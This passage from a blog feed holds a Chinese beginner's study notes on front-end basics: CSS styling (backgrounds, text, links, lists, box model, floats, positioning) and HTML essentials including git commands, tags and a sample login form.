外部样式和内部样式合并之后  一起解析</p><p>​                    先外部样式后内部样式</p></li><li><p><strong>内联样式</strong>:  外部和内部样式解析完后，才解析内联样式</p></li><li><p><strong>加了important字段的最后执行</strong>:  </p><pre><code class="css">div{    background-color: red!important; /*可以测试用*/}</code></pre></li></ul><h3 id="五、背景"><a href="#五、背景" class="headerlink" title="五、背景"></a>五、背景</h3><pre><code class="css">body {    background-color: red；/*颜色*/    background-image: url(&#39;图片地址&#39;)/*图片复制平铺完整个页面*/    background-repeat: repeat-x;/*沿着x轴平铺/    background-repeat: no-repeat;/*不平铺，就一张图片*/    background-position: 100px 100px;/*50% 0%;*//*x轴 y轴*//*图片移动*/    /*x:left center(50%) right  y:top(0%) center(50%) bottom*/    background-attachment: fixed/*固定背景*/    /*可简写成background: color image repeat attachment;*/    background: red url(&#39;图片地址&#39;) repeat-x fixed;}</code></pre><h3 id="六、文本"><a href="#六、文本" class="headerlink" title="六、文本"></a>六、文本</h3><pre><code class="css">/*字符间距*/letter-spacing: 0px;/*空格的距离*/word-spacing:0px;</code></pre><pre><code class="css">direction: ltr; /*left to right文本从左到右排列*/</code></pre><pre><code class="css">text-decoration: none;/*默认*/text-decoration: line-through;/*一条线中间穿过*/text-decoration: overline;/*一条线上方穿过*/text-decoration: underline;/*一条线下方穿过*/</code></pre><pre><code class="css">/*对齐方式*/text-align: center(居中) left(左) right(右) justify(两端)可以加个宽高和颜色等width:200px;height:200px;</code></pre><pre><code class="css">/*缩进*/text-indent: 50px;</code></pre><pre><code class="css">/*英文字母大小写*/text-transform: uppercase lowercase capitalize(首字母大写)</code></pre><pre><code class="css">/*取消换行*/white-space: nowrap;/*隐藏部分文本内容*/overflow: hidden;/*加省略号*/text-overflow: ellipsis;</code></pre><pre><code class="css">/*图片和文字的搭配*/img{    weight:200px;    /*垂直对齐  top center bottom*/    vertical-align: top;/*文字排在顶端*/    float:left;/*文字围绕图片排列*/}</code></pre><h3 id="七、链接和列表"><a href="#七、链接和列表" class="headerlink" title="七、链接和列表"></a>七、链接和列表</h3><h4 id="1、链接"><a href="#1、链接" class="headerlink" title="1、链接"></a>1、链接</h4><p><img src="http://img-blog.csdnimg.cn/20190426232056608.png" alt="在这里插入图片描述"></p><pre><code class="css">a{    color: green;}</code></pre><p><img src="http://img-blog.csdnimg.cn/20190426232107892.png" alt="在这里插入图片描述"></p><p><strong>伪类</strong></p><pre><code class="css">a:link{    /*初始状态*/    color: blue;}a:visited{ /*被访问*/    color: green;}a:hover{ /*鼠标移动*/    color: yellow;    font-size: 80px;}a:active{ /*点击*/    color: red;}</code></pre><p><img src="http://img-blog.csdnimg.cn/20190426232119364.png" alt="在这里插入图片描述"></p><p><img src="http://img-blog.csdnimg.cn/20190426232129980.png" alt="在这里插入图片描述"></p><p><img src="http://img-blog.csdnimg.cn/20190426232138803.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="http://img-blog.csdnimg.cn/20190426232148136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="2、列表"><a href="#2、列表" class="headerlink" title="2、列表"></a>2、列表</h4><pre><code class="css">ul{    list-style-type: disc;/*实心圆*/}ul前面样式none: 不使用项目符号disc: 实心圆circle: 空心圆square: 实心方块ol前面样式demical: 阿拉伯数字lower-alpha: 小写英文字母upper-alpha: 大写英文字母lower-roman: 小写罗马数字upper-roman: 大写罗马数字</code></pre><p><strong>列表加图片logo样式</strong></p><pre><code class="css">li{    background-image: url(&#39;图片路径&#39;);    background-repeat: no-repeat;/*消去平铺*/    height: 50px;    padding: 25px 50px 0;/*盒子模型调整图片位置*/}</code></pre><p><img src="http://img-blog.csdnimg.cn/20190426232202859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="http://img-blog.csdnimg.cn/20190426232210633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="八、盒子模型"><a href="#八、盒子模型" class="headerlink" title="八、盒子模型"></a>八、盒子模型</h3><p>所有的元素可以看成矩形的盒子</p><p>内容  内边距 盒子框 外边距</p><pre><code class="html">&lt;div class=&quot;box1&quot;&gt;div1&lt;/div&gt;&lt;div class=&quot;box2&quot;&gt;div2&lt;/div&gt;</code></pre><pre><code class="css">.box1{/*盒子框*/    border: 5px solid blue;    /*内边距 上下 左右*/    padding: 10px 10px;    /*上 左右 下*/    padding: 10px 20px 10px;    /*上 右 下 左*/    padding: 10px 20px 10px 20px;    可写成：    padding-top:    padding-bottom:    padding-left:    padding-right:   /* background-color: green;*/   /*外边距*/    margin: 20px;/*和内边距相似*/}.box2{    border: 5px solid black;}</code></pre><p><img src="http://img-blog.csdnimg.cn/20190426232223365.png" alt="在这里插入图片描述"></p><h3 id="九、布局"><a href="#九、布局" class="headerlink" title="九、布局"></a>九、布局</h3><p><strong>标准流</strong>：从上往下排列</p><p><img src="http://img-blog.csdnimg.cn/20190426232235686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="http://img-blog.csdnimg.cn/20190426232243951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>浮动：float</p><p><code>float: left right;</code></p><p><img src="http://img-blog.csdnimg.cn/2019042623225579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="http://img-blog.csdnimg.cn/2019042623230334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><code>clear: both;/*调整后，在下个div容器清除浮动，回到标准流状态*/</code></p><p><img src="http://img-blog.csdnimg.cn/2019042623231547.png" alt="在这里插入图片描述"></p><pre><code class="css">/*伪元素*/清浮动.container::after{    content: &quot;&quot;;    display: block;    clear: both;}</code></pre><pre><code class="css">/*伪元素 清理浮动和margin*/.container::before{    content: &quot;&quot;;    display: table;}.container::after{    clear: both;}</code></pre><h3 id="十、定位"><a href="#十、定位" class="headerlink" title="十、定位"></a>十、定位</h3><pre><code class="css">div{    width: 200px;    height: 300px;    background: blue;    /*定位 固定定位*/    position: fixed;    bottom: 100px;    right: 50px;}.div1{/*相对定位*/    position: relative;    top: 50px;    left: 100px;}</code></pre><pre><code class="css">/*绝对定位 不跟父元素(如:.container)一起移动*/.div1{    position: absolute;    top: 50px;    left: 100px;}</code></pre><p>上面便是我对Web前端CSS部分的学习，学习总会有收获，No pain No gain! 小白进阶ing</p><p>一起努力进阶吧！！！！</p>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web前端 </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web前端-HTML篇</title>
      <link href="/2019/03/25/Web%E5%89%8D%E7%AB%AF-HTML%E7%AF%87/"/>
      <url>/2019/03/25/Web%E5%89%8D%E7%AB%AF-HTML%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>最近学习了Web前端的入门课程，深有感触，于是写了这篇学习笔记总结了一下，希望能加深自己的理解，而在此之前，为了写一个表单提交页面，学习了一些html的基础知识。在这些基础上学习Web前端，感觉学习轻松多了有么有？感觉真好！</p><h3 id="一、前端介绍"><a href="#一、前端介绍" class="headerlink" title="一、前端介绍"></a>一、前端介绍</h3><ol><li>前端包括：html、css、javascript</li><li>入门阶段：改一般页面和动效</li><li>前端历史：第一个<a href="http://info.cern.ch/" target="_blank" rel="noopener">网站</a>→table表格→JavaScript→Flash→CSS→栅栏与框架→响应式→ H5(HTML5)</li></ol><h3 id="二、Web编程-环境搭建"><a href="#二、Web编程-环境搭建" class="headerlink" title="二、Web编程-环境搭建"></a>二、Web编程-环境搭建</h3><h4 id="1、网页浏览器："><a href="#1、网页浏览器：" class="headerlink" title="1、网页浏览器："></a>1、网页浏览器：</h4><ul><li>谷歌、火狐、IE、苹果Safari</li><li>F12打开控制台</li></ul><h4 id="2、代码编译器"><a href="#2、代码编译器" class="headerlink" title="2、代码编译器"></a>2、代码编译器</h4><ul><li><a href="https://code.visualstudio.com/" target="_blank" rel="noopener">vscode</a>、<a href="https://www.sublimetext.com/" target="_blank" rel="noopener">sublime</a>、atom、webstorm、dreamwarver</li><li>设置Tab、插件</li></ul><h4 id="3、git代码管理"><a href="#3、git代码管理" class="headerlink" title="3、git代码管理"></a>3、git代码管理</h4><h5 id="1-代码仓库"><a href="#1-代码仓库" class="headerlink" title="1.代码仓库"></a>1.代码仓库</h5><p>统一保存、管理代码的地方　如：github</p><h5 id="2-git及简单操作"><a href="#2-git及简单操作" class="headerlink" title="2.git及简单操作"></a>2.git及简单操作</h5><ul><li><p><code>cd C:</code> 进入到c盘</p></li><li><p><code>cd Users/Test</code> 进入到当前盘的Users/Test文件夹</p></li><li><p><code>git init</code> 创建代码仓库</p></li><li><p><code>git init</code> 在一个文件目录执行该指令，会把该目录快速设置成git的代码仓库。</p></li><li><p><code>git clone 仓库地址</code> 克隆仓库到本地</p></li><li><p><code>git config --global user,name &quot;XX&quot;</code> 配置身份信息</p></li><li><p><code>git config --global user.email &quot;xx@qq.com&quot;</code> 配置身份信息</p></li><li><p><code>git add xx.xml</code> 后面可以加单独的文件</p><p><code>git add app</code> app是一个文件夹</p><p><code>git add .</code> 全部文件</p><p>add这个只是添加，我们还需要提交</p></li><li><p><code>git commit -m &quot;First commit&quot;</code> 双引号之中是相关的描述,提交(提交到本地缓存的仓库)更新文件</p></li><li><p><code>git push</code> 提交到远程仓库</p></li></ul><h3 id="三、网页基本概念与基本结构"><a href="#三、网页基本概念与基本结构" class="headerlink" title="三、网页基本概念与基本结构"></a>三、网页基本概念与基本结构</h3><h4 id="1、基本概念"><a href="#1、基本概念" class="headerlink" title="1、基本概念"></a>1、基本概念</h4><ul><li><p>网页是构成网站的基本元素，是承载各种网站应用的平台</p><p>是html文档经过浏览器<u>渲染</u>以后展示出来的页面　 html文档：后缀为<code>.html</code></p></li><li><p>渲染：代码经过浏览器处理，产生人正常能看懂的页面</p></li><li><p>编码：通过代码形式，把要展示的页面写到html文档</p></li></ul><h5 id="1-html-css页面内容"><a href="#1-html-css页面内容" class="headerlink" title="1.html+css页面内容"></a>1.html+css页面内容</h5><h6 id="html：负责页面结构"><a href="#html：负责页面结构" class="headerlink" title="html：负责页面结构"></a>html：负责页面结构</h6><p><strong>文本内容：能被浏览器直接显示出来的文字和符号</strong></p><p><strong>标签：不能被浏览器直接显示出来的、具有特殊意义的，用尖括号括起来的字符</strong></p><p>主要标签包括：文本、图片、链接、列表、表格、表单、框架(嵌套页面)</p><p><strong>语法：</strong></p><ol><li>html从上往下解析</li><li>元素可以互相嵌套</li><li>html的结构</li></ol><h6 id="css负责页面样式"><a href="#css负责页面样式" class="headerlink" title="css负责页面样式"></a>css负责页面样式</h6><h5 id="2-javascript页面行为"><a href="#2-javascript页面行为" class="headerlink" title="2.javascript页面行为"></a>2.javascript页面行为</h5><h4 id="2、基本结构"><a href="#2、基本结构" class="headerlink" title="2、基本结构"></a>2、基本结构</h4><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh&quot;&gt;    &lt;!-- lang属性声明主要语言，属性值zh：中文，属性值en：英文 --&gt;&lt;head&gt;                &lt;!-- 主要配置信息,设置 --&gt;&lt;title&gt;标题&lt;/title&gt;&lt;meta charset=&quot;utf-8&quot;/&gt;    &lt;!-- 属性值还有gbk和gb2312 --&gt;&lt;/head&gt; &lt;body&gt;                 &lt;!-- body标签可以写css属性 --&gt;&lt;h1&gt;我的第一个标题&lt;/h1&gt;&lt;p&gt;我的第一个段落&lt;/p&gt;&lt;/body&gt;    &lt;/html&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/2019042416093522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="四、前端基础HTML"><a href="#四、前端基础HTML" class="headerlink" title="四、前端基础HTML"></a>四、前端基础HTML</h3><h4 id="1、文本"><a href="#1、文本" class="headerlink" title="1、文本"></a>1、文本</h4><h5 id="1-水平线"><a href="#1-水平线" class="headerlink" title="1.水平线"></a>1.水平线</h5><p>单纯水平线：<code>&lt;hr /&gt;</code> 类型：单标签</p><h5 id="2-主题内容中的标题"><a href="#2-主题内容中的标题" class="headerlink" title="2.主题内容中的标题"></a>2.主题内容中的标题</h5><pre><code class="html">    &lt;h1&gt;&lt;/h1&gt;        &lt;!-- 一级标题 --&gt;    &lt;h2&gt;&lt;/h2&gt;        &lt;!-- 二级标题 --&gt;    &lt;h3&gt;&lt;/h3&gt;        &lt;!-- 三级标题 --&gt;    &lt;h4&gt;&lt;/h4&gt;        &lt;!-- 四级标题 --&gt;    &lt;h5&gt;&lt;/h5&gt;        &lt;!-- 五级标题 --&gt;    &lt;h6&gt;&lt;/h6&gt;        &lt;!-- 六级标题 --&gt;</code></pre><p>类型：双标签</p><h5 id="3-段落"><a href="#3-段落" class="headerlink" title="3.段落"></a>3.段落</h5><p><code>&lt;p&gt;&lt;/p&gt;</code>类型：双标签</p><h5 id="4-换行"><a href="#4-换行" class="headerlink" title="4.换行"></a>4.换行</h5><p><code>&lt;br /&gt;</code> 类型：单标签</p><h5 id="5-空格"><a href="#5-空格" class="headerlink" title="5.空格"></a>5.空格</h5><p>（1）<code>&amp;nbsp</code> 不是标签，可以当做特殊字符。</p><p>（2）输入法用全角</p><h4 id="2、图片"><a href="#2、图片" class="headerlink" title="2、图片"></a>2、图片</h4><pre><code class="html">    &lt;img src=&quot;&quot; alt=&quot;&quot; width=&quot;&quot; height=&quot;&quot; /&gt;</code></pre><p>属性src里填图片路径<br>图片路径分为：绝对路径和相对路径<code>&lt;!--相对路径：相对于当前html文件路径--&gt;</code></p><p><em>./当前目录../上一级目录</em><br><em>在当前目录建一个文件夹：images 将所展示图片都放在里面</em></p><p>属性alt里填图片说明<br>属性width里填图片长度：也可以用百分比表示<br>属性height里填图片高度：也可以用百分比表示<br>类型：内联元素<br>实例</p><pre><code class="html">    &lt;img src=&quot;1.jpg&quot; alt=&quot;哈士奇&quot; width=&quot;100&quot; height=&quot;100&quot;/&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190424161011833.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/2019042416102221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="3、链接"><a href="#3、链接" class="headerlink" title="3、链接"></a>3、链接</h4><pre><code class="html">    &lt;a href=&quot;http://www.baidu.com/&quot; title=&quot;鼠标悬停显示&quot; target=&quot;_blank&quot;&gt;百度一下&lt;/a&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190424161040915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>属性href：需要连接的网址，网站建设初期用#链接表示空链接</p><p>属性title：鼠标悬停显示</p><p>属性target：设置_blank，在新窗口打开链接地址</p><p>类型：内联元素</p><h4 id="4、图片映射"><a href="#4、图片映射" class="headerlink" title="4、图片映射"></a>4、图片映射</h4><p>（1）为map标签加上id属性，定义一个唯一属性<br>（2）为保证兼容性加name属性，属性值与id值相同<br>（3）为map标签所作用图片img标签加usemap属性，属性名为#id名称<br>（4）在map标签内嵌套area标签实现给指定区域加链接</p><pre><code class="html">    &lt;area shape=&quot;&quot; coords=&quot;&quot; href=&quot;&quot; alt=&quot;&quot; /&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/2019042416110232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190424161114941.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>属性shape：定义链接区域形状，常用值rect（矩形）circle（圆形） poly(多边形)<br>属性coords：确定区域精确位置，填坐标<code>&lt;!--以左上角为原点--&gt;</code><br>属性href：链接地址<br>属性alt：链接说明</p><h4 id="5、列表"><a href="#5、列表" class="headerlink" title="5、列表"></a>5、列表</h4><h5 id="1-有序列表"><a href="#1-有序列表" class="headerlink" title="1.有序列表"></a>1.有序列表</h5><pre><code class="html">    &lt;ol&gt;        &lt;li&gt;&lt;/li&gt;        &lt;li&gt;&lt;/li&gt;    &lt;/ol&gt;</code></pre><p><em>子元素，父元素，后代元素，兄弟元素</em></p><p><img src="http://img-blog.csdnimg.cn/20190424161129880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190424161138916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="2-无序列表"><a href="#2-无序列表" class="headerlink" title="2.无序列表"></a>2.无序列表</h5><pre><code class="html">&lt;!-- 列表需要嵌套写法 --&gt;    &lt;ul&gt;        &lt;li&gt;&lt;/li&gt;        &lt;li&gt;&lt;/li&gt;    &lt;/ul&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190424161154724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190424161201972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="3-定义列表"><a href="#3-定义列表" class="headerlink" title="3.定义列表"></a>3.定义列表</h5><pre><code class="html">    &lt;dl&gt;        &lt;dt&gt;&lt;/dt&gt;        &lt;dd&gt;        &lt;/dd&gt;        &lt;/dl&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190424161222274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190424161231309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="6、表格"><a href="#6、表格" class="headerlink" title="6、表格"></a>6、表格</h4><p>实例</p><pre><code class="html">    &lt;table border=&quot;1&quot; cellpadding=&quot;2&quot; cellspacing=&quot;1&quot;&gt;        &lt;tr&gt;            &lt;th&gt;姓名&lt;/th&gt;            &lt;th&gt;学号&lt;/th&gt;            &lt;th&gt;年龄&lt;/th&gt;            &lt;th&gt;成绩&lt;/th&gt;        &lt;/tr&gt;        &lt;tr&gt;            &lt;td&gt;小王&lt;/td&gt;            &lt;td&gt;133&lt;/td&gt;            &lt;td&gt;19&lt;/td&gt;            &lt;td&gt;100&lt;/td&gt;        &lt;/tr&gt;    &lt;/table&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190424161248528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190424161256621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>table标签<br>属性：border 作用：规定表格边框宽度<br>属性：cellpadding 作用：规定文字和边框的间距<br>属性：cellspacing 作用：规定每个单元格边框宽度<br>tr标签：html表格中的行<br>th标签：表格内表头单元格<br>td标签：表格内普通单元格<br>常用属性：<br>colspan：规定单元格可横跨列数，值为数字<br>rowspan：规定单元格可横跨行数，值为数字</p><h4 id="7、表单"><a href="#7、表单" class="headerlink" title="7、表单"></a>7、表单</h4><h5 id="1-标签-lt-form-gt-：定义供用户输入的html表单"><a href="#1-标签-lt-form-gt-：定义供用户输入的html表单" class="headerlink" title="1.标签&lt;form&gt;：定义供用户输入的html表单"></a>1.标签<code>&lt;form&gt;</code>：定义供用户输入的html表单</h5><p>属性：<br>action：规定提交表单向何处发送表单数据<br>name：表单命名<br>target：_blank在新窗口打开<br>method：提交方式，get或post值<br>类型：双标签</p><h5 id="2-lt-input-gt-标签-定义表单输入页面"><a href="#2-lt-input-gt-标签-定义表单输入页面" class="headerlink" title="2.&lt;input&gt;标签:定义表单输入页面"></a>2.<code>&lt;input&gt;</code>标签:定义表单输入页面</h5><pre><code>&lt;!-- 通过type属性展示不同输入页面，通过value改变默认值 --&gt;</code></pre><h6 id="（1）普通文本框："><a href="#（1）普通文本框：" class="headerlink" title="（1）普通文本框："></a>（1）普通文本框：</h6><pre><code class="html">    &lt;input type=&quot;text&quot; /&gt;</code></pre><h6 id="（2）密码框："><a href="#（2）密码框：" class="headerlink" title="（2）密码框："></a>（2）密码框：</h6><pre><code class="html">    &lt;input type=&quot;password&quot; /&gt;</code></pre><h6 id="（3）文件上传："><a href="#（3）文件上传：" class="headerlink" title="（3）文件上传："></a>（3）文件上传：</h6><pre><code class="html">    &lt;input type=&quot;file&quot; /&gt;</code></pre><h6 id="（4）隐藏的input："><a href="#（4）隐藏的input：" class="headerlink" title="（4）隐藏的input："></a>（4）隐藏的input：</h6><pre><code class="html">    &lt;input type=&quot;hidden&quot; /&gt;</code></pre><h6 id="（5）普通按钮："><a href="#（5）普通按钮：" class="headerlink" title="（5）普通按钮："></a>（5）普通按钮：</h6><pre><code class="html">    &lt;input type=&quot;button&quot; /&gt;</code></pre><h6 id="（6）单选："><a href="#（6）单选：" class="headerlink" title="（6）单选："></a>（6）单选：</h6><pre><code class="html">&lt;input type=&quot;radio&quot; /&gt;  &lt;!--通过相同name属性实现单选--&gt;</code></pre><p>实例</p><pre><code class="html">      &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;男&lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;女</code></pre><h6 id="（7）复选框："><a href="#（7）复选框：" class="headerlink" title="（7）复选框："></a>（7）复选框：</h6><pre><code class="html">    &lt;input type=&quot;checkbox&quot; /&gt;`</code></pre><h6 id="（8）提交："><a href="#（8）提交：" class="headerlink" title="（8）提交："></a>（8）提交：</h6><pre><code class="html">    &lt;input type=&quot;submit&quot; /&gt;</code></pre><h6 id="（9）重置："><a href="#（9）重置：" class="headerlink" title="（9）重置："></a>（9）重置：</h6><pre><code class="html">    &lt;input type=&quot;reset&quot; /&gt;</code></pre><p>属性placeholder 可用值text：规定帮助用户填写输入字段提示<br>属性checked 可用值checked：用于选择页面（单复选），实现默认选择<br>属性disabled 可用值disabled：使标签不可用<br>属性name：给input输入界面起名字<br>属性readonly 可用值readonly ：使输入界面为只读状态<br>属性size 值为数字：设置输入框长度<br>属性value：该属性值为input提交到页面的数据，可通过该属性设置默认值</p><h5 id="3-textarea标签：定义多行输入框"><a href="#3-textarea标签：定义多行输入框" class="headerlink" title="3.textarea标签：定义多行输入框"></a>3.textarea标签：定义多行输入框</h5><pre><code class="html">    &lt;!--双标签，默认值写标签之间--&gt;</code></pre><p>属性cols 值为数字<br>属性rows 值为数字<br>也可使用disabled name readonly属性<br>实例</p><pre><code class="html">    自我介绍：&lt;textarea cols=&quot;20&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt;</code></pre><h5 id="4-label标签：提升用户体验"><a href="#4-label标签：提升用户体验" class="headerlink" title="4.label标签：提升用户体验"></a>4.label标签：提升用户体验</h5><p>标签for属性与input的id属性相同</p><h5 id="5-select标签：配合option实现下拉菜单"><a href="#5-select标签：配合option实现下拉菜单" class="headerlink" title="5.select标签：配合option实现下拉菜单"></a>5.select标签：配合option实现下拉菜单</h5><p>可用属性：disabled name multiple</p><pre><code class="html">    &lt;select&gt;        &lt;option&gt;&lt;/option&gt;    &lt;/select&gt;</code></pre><h5 id="6-option标签"><a href="#6-option标签" class="headerlink" title="6.option标签"></a>6.option标签</h5><p>可用属性：disabled select value</p><h5 id="7-optgroup标签"><a href="#7-optgroup标签" class="headerlink" title="7.optgroup标签"></a>7.optgroup标签</h5><pre><code>    &lt;!--把相关选项组合在一起--&gt;</code></pre><p>属性label：给选项组命名<br>属性disabled：停用该选项组<br>实例</p><pre><code class="html">       &lt;select&gt;            &lt;optgroup label=&quot;河南省&quot;&gt;                &lt;option value=&quot;周口&quot;&gt;周口&lt;/option&gt;                &lt;option&gt;郑州&lt;/option&gt;                &lt;option&gt;洛阳&lt;/option&gt;            &lt;/optgroup&gt;        &lt;/select&gt;</code></pre><h5 id="表单提交实例"><a href="#表单提交实例" class="headerlink" title="表单提交实例"></a>表单提交实例</h5><pre><code class="html">    &lt;!DOCTYPE html&gt;    &lt;html&gt;        &lt;head&gt;            &lt;meta charset=&quot;utf-8&quot; /&gt;            &lt;title&gt;html表单提交&lt;/title&gt;        &lt;/head&gt;     &lt;body&gt;         &lt;h1&gt;账户登录&lt;/h1&gt;        &lt;form name=&quot;submit&quot; action=&quot;http://www.baidu.com/&quot; target=&quot;_blank&quot; method=&quot;get&quot;&gt;            &lt;!-- 由于表单提交需要进行数据处理，html语言无法实现，暂且写成向百度提交数据 --&gt;            账号：&lt;input name=&quot;text&quot; type=&quot;text&quot; size=&quot;20&quot; /&gt;            &lt;br /&gt;            密码：&lt;input name=&quot;password&quot; type=&quot;password&quot; size=&quot;20&quot; /&gt;            &lt;br /&gt;            &lt;input type=&quot;submit&quot; value=&quot;确认登录&quot; /&gt;        &lt;/form&gt;    &lt;/body&gt;        &lt;/html&gt; </code></pre><p><img src="http://img-blog.csdnimg.cn/20190424161320814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="8、布局"><a href="#8、布局" class="headerlink" title="8、布局"></a>8、布局</h4><p>将小块排列好</p><h5 id="1-div容器布局"><a href="#1-div容器布局" class="headerlink" title="1.div容器布局"></a>1.div容器布局</h5><pre><code class="html">&lt;div style=&quot;background:blue; height:80px;&quot;&gt;菜单&lt;/div&gt;&lt;div style=&quot;background:yellow; width:50%;&quot;&gt;导航&lt;/div&gt;&lt;div style=&quot;background:red; width:50%;&quot;&gt;关于&lt;/div&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190424161338818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190424161348534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="2-table布局"><a href="#2-table布局" class="headerlink" 